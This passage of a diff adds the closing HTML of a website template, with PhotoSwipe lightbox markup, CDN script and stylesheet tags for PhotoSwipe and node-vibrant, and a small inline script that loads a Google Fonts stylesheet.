+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
